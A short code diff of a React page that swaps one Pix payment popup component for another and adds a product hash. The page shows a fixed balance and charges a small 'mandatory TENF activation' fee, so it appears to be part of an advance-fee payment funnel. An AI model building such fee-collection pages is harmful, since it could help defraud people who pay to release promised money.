@@ -1,6 +1,6 @@
 import { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
-import ZyroPayPixPopup from '@/components/ZyroPayPixPopup';
+import ParadisePixPopup from '@/components/ParadisePixPopup';
 import PageTransition from '@/components/PageTransition';
 import { trackViewContent } from '@/lib/tiktokPixel';
 import '../styles/app.css';
@@ -8,6 +8,7 @@ import '../styles/app.css';
 const SALDO_FINAL = 2834.72;
 const TAXA_TENF = 17.90;
 const TAXA_TENF_CENTAVOS = 1790;
+const PRODUCT_HASH = 'prod_0a240a2e87de20da';
 
 const formatBR = (value: number) => {
   return value
@@ -91,9 +92,10 @@ const Up1 = () => {
         </div>
 
         {showPixPopup && (
-          <ZyroPayPixPopup
+          <ParadisePixPopup
             amount={TAXA_TENF_CENTAVOS}
             description="Ativação TENF obrigatório"
+            productHash={PRODUCT_HASH}
             onSuccess={handlePaymentSuccess}
             onClose={() => setShowPixPopup(false)}
           />
